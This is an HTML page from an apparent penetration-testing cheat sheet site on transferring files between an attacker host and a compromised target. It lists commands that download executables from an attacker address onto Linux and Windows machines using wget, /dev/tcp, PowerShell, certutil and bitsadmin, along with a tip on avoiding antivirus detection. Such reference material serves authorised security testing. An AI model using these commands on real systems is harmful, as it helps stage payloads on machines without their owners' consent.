@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html lang="en-US" dir="ltr" class="">
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>File Transfer | JinPwn</title><meta name="description" content="Move files between attacker and target. Pick the method that survives the network you are in.">
+<meta name="robots" content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1">
+<meta name="googlebot" content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1">
+
+<link rel="canonical" href="https://jinpwn.dev/cheatsheets/misc/file-transfer/">
+<meta property="og:title" content="File Transfer | JinPwn">
+<meta property="og:description" content="Move files between attacker and target. Pick the method that survives the network you are in.">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://jinpwn.dev/cheatsheets/misc/file-transfer/">
+<meta property="og:site_name" content="JinPwn">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://jinpwn.dev/images/og/og.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="File Transfer | JinPwn">
+<meta name="twitter:description" content="Move files between attacker and target. Pick the method that survives the network you are in.">
+<meta name="twitter:image" content="https://jinpwn.dev/images/og/og.png">
+<meta name="twitter:site" content="@jinpwn">
+<meta name="twitter:creator" content="@jinpwn">
+
+
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"WebPage","description":"Move files between attacker and target. Pick the method that survives the network you are in.","image":["https://jinpwn.dev/images/og/og.png"],"inLanguage":"en-US","name":"File Transfer | JinPwn","url":"https://jinpwn.dev/cheatsheets/misc/file-transfer/"}</script>
+
+<meta name="theme-color" content="#111111">
+<link rel="icon" type="image/png" href="/favicon.png">
+
+      <link rel="stylesheet" href="/css/site.min.bbc8db26832d45b71fab2c52bea8e7468ac7f3d71458dff1936b8d5891ff48a8.css" integrity="sha256-u8jbJoMtRbcfqyxSvqjnRorH89cUWN/xk2uNWJH/SKg=" crossorigin="anonymous">
+
+
+        <script src="/js/main.e9594fc927ccbd51f2ef3a698abafb8bbf09dcc796037e0a51eedfb14ca858f4.js" integrity="sha256-6VlPySfMvVHy7zppirr7i78J3MeWA34KUe7fsUyoWPQ=" crossorigin="anonymous" defer></script>
+        <script src="/js/asm-highlight.d74879c0e3b6982d95821f5d83904fa40660a6a7e4a2442cdc4bda545679f540.js" integrity="sha256-10h5wOO2mC2Vgh9dg5BPpAZgpqfkokQs3EvaVFZ59UA=" crossorigin="anonymous" defer></script>
+
+
+</head>
+<body class="">
+  
+
+
+
+
+
+  
+  
+  
+
+
+
+  
+
+<header class="site-header">
+  <nav class="top-nav">
+    <div class="container nav-inner">
+      <div class="nav-left">
+        <a href="/" class="brand-link has-logo" aria-label="Home"><img src="/favicon.png" alt="jinpwn.dev" class="brand-logo" style="--brand-logo-height: 36px;"></a>
+        <div class="nav-links desktop-only">
+          
+    <a href="/">Posts</a>
+    <a href="/posts/">Archive</a>
+    <a href="/cheatsheets/" class="is-current">Cheatsheets</a>
+    <a href="/about/">About</a>
+
+        </div>
+      </div>
+      <div class="nav-actions">
+        <div class="search-anchor" id="search-root" data-search-root>
+          <label class="search-trigger" for="search-input">
+            <span class="search-glyph" aria-hidden="true">
+              <svg viewBox="0 0 24 24">
+                <circle cx="11" cy="11" r="7"></circle>
+                <path d="M20 20L16.65 16.65"></path>
+              </svg>
+            </span>
+            <input id="search-input" type="search" placeholder="Search..." autocomplete="off" spellcheck="false" aria-label="Search posts and cheatsheets">
+            <button type="button" class="search-clear" data-search-clear aria-label="Clear search" hidden>
+              <svg viewBox="0 0 24 24" aria-hidden="true">
+                <path d="M18 6L6 18"></path>
+                <path d="M6 6l12 12"></path>
+              </svg>
+            </button>
+            <span class="search-trigger-shortcut desktop-only" aria-hidden="true">CTRL K</span>
+          </label>
+          <div id="search-dropdown" class="search-dropdown" hidden data-search-index-url="/search-index.json" data-search-runtime-url="/js/search-flex.1b1c225e3d6a2ff08480727a5e3bf93df59715e138fede75b7616d9c75fc4fa7.js">
+  <p class="search-status" data-search-status aria-live="polite">Type to search posts and cheatsheets.</p>
+  <div class="search-results" data-search-results role="listbox" aria-label="Search results">
+    <p class="search-empty">Type to search posts and cheatsheets.</p>
+  </div>
+</div>
+
+        </div>
+        <button class="icon-button mobile-only" type="button" data-search-mobile-toggle aria-label="Search" aria-expanded="false" aria-controls="search-root">
+          <svg viewBox="0 0 24 24" aria-hidden="true">
+            <circle cx="11" cy="11" r="7"></circle>
+            <path d="M20 20L16.65 16.65"></path>
+          </svg>
+        </button>
+        <button class="icon-button mobile-only" type="button" data-mobile-toggle aria-label="Toggle menu" aria-expanded="false" aria-controls="mobile-nav">
+          <svg viewBox="0 0 24 24" aria-hidden="true" data-menu-open-icon>
+            <path d="M3 6h18"></path>
+            <path d="M3 12h18"></path>
+            <path d="M3 18h18"></path>
+          </svg>
+          <svg viewBox="0 0 24 24" aria-hidden="true" data-menu-close-icon hidden>
+            <path d="M18 6L6 18"></path>
+            <path d="M6 6l12 12"></path>
+          </svg>
+        </button>
+      </div>
+    </div>
+    <div id="mobile-nav" class="mobile-nav">
+      
+    <a href="/">Posts</a>
+    <a href="/posts/">Archive</a>
+    <a href="/cheatsheets/" class="is-current">Cheatsheets</a>
+    <a href="/about/">About</a>
+
+    </div>
+  </nav>
+</header>
+
+  
+  <main class="site-main">
+    
+  
+  
+  
+  <article class="container cheatsheet-docs-shell">
+    <div class="cheatsheet-docs-layout">
+      
+        <aside class="cheatsheet-sidebar" aria-label="Misc navigation">
+    <div class="cheatsheet-sidebar-inner">
+      
+        <a href="/cheatsheets/" class="cheatsheet-sidebar-root">All cheatsheets</a>
+      
+      <a href="/cheatsheets/misc/" class="cheatsheet-sidebar-section">Misc</a>
+      
+        <nav class="cheatsheet-sidebar-nav">
+          <ul class="cheatsheet-sidebar-list">
+            
+              <li>
+                <a href="/cheatsheets/misc/00-tooling-moc/" class="cheatsheet-sidebar-link">Tooling MOC</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/misc/file-transfer/" class="cheatsheet-sidebar-link is-current">File Transfer</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/misc/ldap/" class="cheatsheet-sidebar-link">LDAP</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/misc/password-cracking/" class="cheatsheet-sidebar-link">Password Cracking</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/misc/pivoting/" class="cheatsheet-sidebar-link">Pivoting</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/misc/recon-external/" class="cheatsheet-sidebar-link">Recon (external)</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/misc/reverse-shells/" class="cheatsheet-sidebar-link">Reverse Shells</a>
+              </li>
+            
+          </ul>
+        </nav>
+      
+    </div>
+  </aside>
+      
+      <div class="cheatsheet-docs-main cheatsheet-page-main">
+        <header class="cheatsheet-page-header">
+          <h1>File Transfer</h1>
+          
+        </header>
+
+        
+          <details class="cheatsheet-mobile-sections">
+    <summary class="cheatsheet-mobile-sections-summary">
+      <span class="cheatsheet-mobile-sections-label">Sections</span>
+      <span class="cheatsheet-mobile-sections-current">File Transfer</span>
+      <span class="cheatsheet-mobile-sections-caret" aria-hidden="true"></span>
+    </summary>
+    <div class="cheatsheet-mobile-sections-panel">
+      <nav aria-label="Misc sections">
+        <ul class="cheatsheet-mobile-sections-list">
+          
+            <li>
+              <a href="/cheatsheets/" class="cheatsheet-mobile-sections-link cheatsheet-mobile-sections-root">All cheatsheets</a>
+            </li>
+          
+          <li>
+            <a href="/cheatsheets/misc/" class="cheatsheet-mobile-sections-link">Overview</a>
+          </li>
+          
+            <li>
+              <a href="/cheatsheets/misc/00-tooling-moc/" class="cheatsheet-mobile-sections-link">Tooling MOC</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/misc/file-transfer/" class="cheatsheet-mobile-sections-link is-current">File Transfer</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/misc/ldap/" class="cheatsheet-mobile-sections-link">LDAP</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/misc/password-cracking/" class="cheatsheet-mobile-sections-link">Password Cracking</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/misc/pivoting/" class="cheatsheet-mobile-sections-link">Pivoting</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/misc/recon-external/" class="cheatsheet-mobile-sections-link">Recon (external)</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/misc/reverse-shells/" class="cheatsheet-mobile-sections-link">Reverse Shells</a>
+            </li>
+          
+        </ul>
+      </nav>
+    </div>
+  </details>
+        
+
+        <div class="markdown-content cheatsheet-page-body">
+          <p>Move files between attacker and target. Pick the method that survives the network you are in.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">LHOST</span><span class="o">=</span>10.10.14.1
+</span></span></code></pre></div><h2 id="i-serve-from-attacker" data-heading-permalink="true"><span class="heading-content">i. Serve from attacker</span>
+    <a class="heading-permalink" href="#i-serve-from-attacker" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>Python HTTP, no uploads:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 -m http.server <span class="m">80</span>
+</span></span></code></pre></div><p>Python HTTP with upload support, accepts POST to /upload:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pip install uploadserver
+</span></span><span class="line"><span class="cl">python3 -m uploadserver <span class="m">80</span>
+</span></span></code></pre></div><p>SMB share, useful for Windows targets that block HTTP egress:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">impacket-smbserver share . -smb2support                                <span class="c1">## guest access</span>
+</span></span><span class="line"><span class="cl">impacket-smbserver share . -smb2support -user u -password p            <span class="c1">## auth required</span>
+</span></span></code></pre></div><p>PHP HTTP, when python is missing:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">php -S 0.0.0.0:80
+</span></span></code></pre></div><p>WebDAV, drag-and-drop friendly from Windows Explorer:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wsgidav --port<span class="o">=</span><span class="m">8080</span> --root<span class="o">=</span>. --auth<span class="o">=</span>anonymous
+</span></span></code></pre></div><h2 id="ii-pull-on-linux-target" data-heading-permalink="true"><span class="heading-content">ii. Pull on Linux target</span>
+    <a class="heading-permalink" href="#ii-pull-on-linux-target" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wget http://<span class="nv">$LHOST</span>/file -O /tmp/file
+</span></span><span class="line"><span class="cl">curl http://<span class="nv">$LHOST</span>/file -o /tmp/file
+</span></span></code></pre></div><p>No wget or curl, pure bash:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">exec</span> 3&lt;&gt;/dev/tcp/10.10.14.1/80
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> -e <span class="s2">&#34;GET /file HTTP/1.0\r\nHost: </span><span class="nv">$LHOST</span><span class="s2">\r\n\r\n&#34;</span> &gt;<span class="p">&amp;</span><span class="m">3</span>
+</span></span><span class="line"><span class="cl">cat &lt;<span class="p">&amp;</span><span class="m">3</span> &gt; /tmp/file
+</span></span><span class="line"><span class="cl"><span class="nb">exec</span> 3&gt;<span class="p">&amp;</span>-
+</span></span></code></pre></div><p>Over openssl when only HTTPS works:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> -e <span class="s2">&#34;GET /file HTTP/1.0\r\nHost: </span><span class="nv">$LHOST</span><span class="s2">\r\n\r\n&#34;</span> <span class="p">|</span> openssl s_client -quiet -connect <span class="nv">$LHOST</span>:443 2&gt;/dev/null <span class="p">|</span> sed <span class="s1">&#39;1,/^\r\{0,1\}$/d&#39;</span> &gt; /tmp/file
+</span></span></code></pre></div><p>Via Python when only python is on the box:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 -c <span class="s2">&#34;import urllib.request; urllib.request.urlretrieve(&#39;http://10.10.14.1/file&#39;,&#39;/tmp/file&#39;)&#34;</span>
+</span></span></code></pre></div><h2 id="iii-pull-on-windows-target" data-heading-permalink="true"><span class="heading-content">iii. Pull on Windows target</span>
+    <a class="heading-permalink" href="#iii-pull-on-windows-target" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>PowerShell, the default:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="py">DownloadFile</span><span class="p">(</span><span class="s1">&#39;http://10.10.14.1/f.exe&#39;</span><span class="p">,</span><span class="s1">&#39;C:\Windows\Temp\f.exe&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">iwr </span><span class="n">-uri</span> <span class="n">http</span><span class="err">:</span><span class="p">//</span><span class="mf">10.10</span><span class="p">.</span><span class="py">14</span><span class="p">.</span><span class="mf">1</span><span class="p">/</span><span class="n">f</span><span class="p">.</span><span class="py">exe</span> <span class="n">-outfile</span> <span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Temp</span><span class="p">\</span><span class="n">f</span><span class="p">.</span><span class="py">exe</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Invoke-WebRequest</span> <span class="n">http</span><span class="err">:</span><span class="p">//</span><span class="mf">10.10</span><span class="p">.</span><span class="py">14</span><span class="p">.</span><span class="mf">1</span><span class="p">/</span><span class="n">f</span><span class="p">.</span><span class="py">exe</span> <span class="n">-OutFile</span> <span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Temp</span><span class="p">\</span><span class="n">f</span><span class="p">.</span><span class="py">exe</span>
+</span></span></code></pre></div><p>When PowerShell is blocked, certutil from cmd:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">certutil -urlcache -split -f http://10.10.14.1/f.exe C:\Windows\Temp\f.exe
+</span></span></code></pre></div><p>Via SMB, no HTTP needed:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl"><span class="k">copy</span> \\10.10.14.1\share\f.exe C:\Windows\Temp\
+</span></span></code></pre></div><p>bitsadmin, legacy but works:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">bitsadmin /transfer job /download /priority high http://10.10.14.1/f.exe C:\Windows\Temp\f.exe
+</span></span></code></pre></div><div class="obsidian-callout callout-warning">
+  <div class="obsidian-callout-header">
+    <div class="obsidian-callout-icon" aria-hidden="true">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z"></path>
+          <path d="M12 9v4"></path>
+          <path d="M12 17h.01"></path></svg>
+    </div>
+    <span class="obsidian-callout-title">AV / Defender</span>
+  </div>
+  <div class="obsidian-callout-body">
+    <p><code>certutil</code> and <code>bitsadmin</code> are flagged by every modern AV. For real engagements use signed binaries and HTTPS, or pull through a tunnel from <a href="https://jinpwn.dev/cheatsheets/misc/pivoting/">Pivoting</a>
+.</p>
+  </div>
+</div>
+<h2 id="iv-cut-and-paste-no-network-at-all" data-heading-permalink="true"><span class="heading-content">iv. Cut and paste, no network at all</span>
+    <a class="heading-permalink" href="#iv-cut-and-paste-no-network-at-all" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>Small files survive any transport this way. Encode on attacker:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">base64 -w0 &lt; file
+</span></span></code></pre></div><p>Paste into target shell:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> BASE64HERE <span class="p">|</span> base64 -d &gt; /tmp/file
+</span></span></code></pre></div><p>Heredoc for text files, no escaping nightmares:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat &gt; /tmp/file &lt;&lt;<span class="s1">&#39;EOF&#39;</span>
+</span></span><span class="line"><span class="cl">... paste content here ...
+</span></span></code></pre></div>
+        </div>
+
+        
+          <nav class="cheatsheet-pager is-split" aria-label="Sibling cheatsheet navigation"><a class="cheatsheet-pager-link is-prev" href="/cheatsheets/misc/00-tooling-moc/">
+            <div class="cheatsheet-pager-copy">
+              <span class="cheatsheet-pager-label">Previous</span>
+              <span class="cheatsheet-pager-title">Tooling MOC</span>
+            </div>
+            <span class="cheatsheet-pager-arrow" aria-hidden="true">
+              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+    <path d="m12 19-7-7 7-7"></path>
+    <path d="M19 12H5"></path>
+  </svg>
+            </span>
+          </a><a class="cheatsheet-pager-link is-next" href="/cheatsheets/misc/ldap/">
+            <div class="cheatsheet-pager-copy">
+              <span class="cheatsheet-pager-label">Next</span>
+              <span class="cheatsheet-pager-title">LDAP</span>
+            </div>
+            <span class="cheatsheet-pager-arrow" aria-hidden="true">
+              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon is-next" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+    <path d="m12 19-7-7 7-7"></path>
+    <path d="M19 12H5"></path>
+  </svg>
+            </span>
+          </a></nav>
+        
+      </div>
+    </div>
+  </article>
+  
+
+  </main>
+  <button class="scroll-top-button" type="button" data-scroll-top aria-label="Scroll to top" aria-hidden="true" tabindex="-1">
+    <svg viewBox="0 0 24 24" aria-hidden="true">
+      <path d="M12 18V6"></path>
+      <path d="M6.75 11.25 12 6l5.25 5.25"></path>
+    </svg>
+  </button>
+  <footer class="site-footer">
+  <p>&copy; 2026 JinPwn</p>
+</footer>
+
+</body>
+</html>
